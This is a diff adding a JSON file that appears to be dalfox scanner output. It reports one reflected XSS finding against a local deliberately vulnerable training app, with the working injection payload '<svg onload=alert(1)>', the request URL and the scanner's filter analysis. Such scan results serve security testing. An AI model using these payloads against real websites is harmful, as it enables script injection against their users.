@@ -1,0 +1,70 @@
+{
+  "findings": [
+    {
+      "confidence": "high",
+      "confidence_reason": "payload reached an executable position in the parsed response",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1?value=%3Csvg%20onload%3Dalert%281%29%20class%3Ddlxca7ca878%3E",
+      "detection_method": "reflection",
+      "evidence": "DOM verification successful for param value (DOM marker)",
+      "filter": {
+        "allowed": [
+          "\"",
+          "$",
+          "'",
+          "(",
+          ")",
+          "+",
+          ",",
+          "-",
+          ".",
+          "/",
+          ":",
+          ";",
+          "<",
+          "=",
+          ">",
+          "[",
+          "\\",
+          "]",
+          "`",
+          "{",
+          "|",
+          "}"
+        ],
+        "blocked": []
+      },
+      "inject_type": "inHTML",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "Triggered XSS Payload (DOM marker): value=<svg onload=alert(1) class=dlxca7ca878>",
+      "method": "GET",
+      "param": "value",
+      "payload": "<svg onload=alert(1) class=dlxca7ca878>",
+      "severity": "High",
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.3.0",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 1,
+    "incomplete": false,
+    "scan_duration_ms": 15,
+    "target_summary": [
+      {
+        "findings_count": 1,
+        "method": "GET",
+        "status": "findings",
+        "target": "http://127.0.0.1:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1?value=vulnerableapp"
+      }
+    ],
+    "targets": [
+      "http://127.0.0.1:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1?value=vulnerableapp"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 8
+  }
+}
